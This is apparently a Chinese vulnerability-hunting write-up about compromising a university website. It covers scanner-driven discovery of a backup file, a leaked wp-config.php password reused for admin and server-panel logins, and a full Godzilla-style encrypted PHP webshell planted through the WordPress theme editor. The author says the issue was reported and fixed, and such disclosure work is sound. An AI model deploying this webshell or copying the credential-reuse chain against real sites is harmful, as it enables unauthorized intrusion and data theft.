刚放假，闲的没事，就想着一边用Xray+rad配合红队师傅写的py脚本来批量挖掘edu漏洞

> py脚本地址: https://github.com/timwhitez/rad-xray  
> Xray地址：https://github.com/chaitin/xray  
> rad地址：https://github.com/chaitin/rad  
> 使用详情请见 https://github.com/timwhitez/rad-xray

连续扫了几天也没啥收获，最后去看了一下漏洞报告，发现了某理工大学旁站的一个备份文件  
![](https://image.3001.net/images/20210709/1625820889_60e80ed9678f6c5ef6f4e.png!small)  
访问 `https://xxxx/backup.zip` 下载备份文件  
![](https://image.3001.net/images/20210709/1625820904_60e80ee88f551c6efdd97.png!small)  
意外在`wp-config.php`中发现了数据库配置信息，其中包含了数据库账号和密码  
![](https://image.3001.net/images/20210709/1625820917_60e80ef57ae389e0c5b27.png!small)  
并且发现了备份了数据库，用记事本打开，发现了用户名跟md5加密后的密码  
![](https://image.3001.net/images/20210709/1625820938_60e80f0a77c7ff1bf1f86.png!small)  
虽然md5加密的密码无法解开，但是我们可以猜测他的数据库密码跟后台密码可能一致，于是用刚刚的数据库密码和这个后台管理员账号登录，成功进入后台  
![](https://image.3001.net/images/20210709/1625820949_60e80f15e7263a59946ea.png!small)  
在外观 -> 主题编辑器 这里发现了可以写入代码的地方，尝试写入一句话，成功写入但蚁剑无法连接，于是尝试用哥斯拉的加密马写入。密码是 `pass`

    
    
    <?php
      @session_start();
      @set_time_limit(0);
      @error_reporting(0);
      function encode($D,$K){
          for($i=0;$i<strlen($D);$i++) {
              $c = $K[$i+1&15];
              $D[$i] = $D[$i]^$c;
          }
          return $D;
      }
      $pass='pass';
      $payloadName='payload';
      $key='3c6e0b8a9c15224a';
      if (isset($_POST[$pass])){
          $data=encode(base64_decode($_POST[$pass]),$key);
          if (isset($_SESSION[$payloadName])){
              $payload=encode($_SESSION[$payloadName],$key);
              eval($payload);
              echo substr(md5($pass.$key),0,16);
              echo base64_encode(encode(@run($data),$key));
              echo substr(md5($pass.$key),16);
          }else{
              if (stripos($data,"getBasicsInfo")!==false){
                  $_SESSION[$payloadName]=encode($data,$key);
              }
          }
      }

成功连接。到这儿就已经拿到webshell了  
![](https://image.3001.net/images/20210709/1625820973_60e80f2db6fd5cf4267e8.png!small)

但是扫描了一下端口，另外还发现9999端口是服务器面板，访问 `https://xxxxx:9999/index.php?c=index&a=login`
猜测密码肯定还是原来的密码，但是用刚刚的账户名不能登录，将账户名改为`admin`密码还是刚刚的`数据库的密码`成功登录服务器管理面板  
![](https://image.3001.net/images/20210709/1625820983_60e80f375e40e8b47a766.png!small)

![](https://image.3001.net/images/20210709/1625820993_60e80f4175246c6920dbf.png!small)  
(ps:该站点已提交EduSRC,并已修复)

